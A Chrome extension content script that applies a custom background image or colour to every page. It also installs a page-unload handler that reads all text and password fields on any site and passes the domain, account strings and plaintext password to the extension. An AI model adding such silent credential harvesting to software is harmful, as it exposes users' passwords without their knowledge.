/*content script 注入到页面执行的脚本,设定在文档渲染之后执行*/
//读取本地存储的背景信息，进行修改背景
chrome.storage.local.get(['type', 'val', 'tColor'], function(data){
	if(data){
		var type = data.type;
		var val = data.val;
		var tColor = data.tColor;
		if(type && type == 'img'){	//使用背景图
			setDomTransparent();
			
			if($('#Acgnu_img_bg').length == 0){
				$('body').append('<img id = "Acgnu_img_bg" src = ' + val + ' />');
				$('#Acgnu_img_bg').css({
					position:'fixed',
					'z-index':-100000,
					left:0,
					top:0,
					//filter:'blur(10px)',
					width:'100%',
					opacity:0.3
				});
			}
		}else if(type && type == 'color'){		//使用背景颜色
			setDomTransparent();
			//document.body.style.backgroundColor=val;
			$('body').css('backgroundColor', val);
		}
		if(tColor){		//变更文字颜色
			document.body.style.color = tColor;
		}
	}
});

function setDomTransparent(){
	$('*').each(function(i, v){
		var cur = $(v);
		var curBg = $(v).css('backgroundColor');
		if(!curBg){
			return true;
		}
		if(curBg.startsWith('#')){
			cur.css('backgroundColor', hexToRgba(curBg, 0.6));
		}
		if(curBg.startsWith('rgb(')){
			cur.css('backgroundColor', rgbToRgba(curBg, 0.6));
		}
	});
}

//监听页面的刷新，离开
window.onbeforeunload = function(e){
	//读取input标签中保存的值
	var remAccount = [];
	var remPwd = '';
	var inputs = document.querySelectorAll('input[type=text],input[type=password]');
	inputs.forEach(function(val, idx){
		if(val.type == 'password'){
			 remPwd = val.value;
			 return;
		 }
		 if(val.value){
			remAccount.push(val.value);
		 }
	});
	
	if(!remPwd){
		return;	//密码都没了，还存个屁
	}
	
	//向扩展发送消息，传递账号信息
	chrome.extension.sendRequest({domain: document.domain, account:remAccount, pwd:remPwd}, function(response) {
		//console.log(response.farewell);
	});
	return null;
}
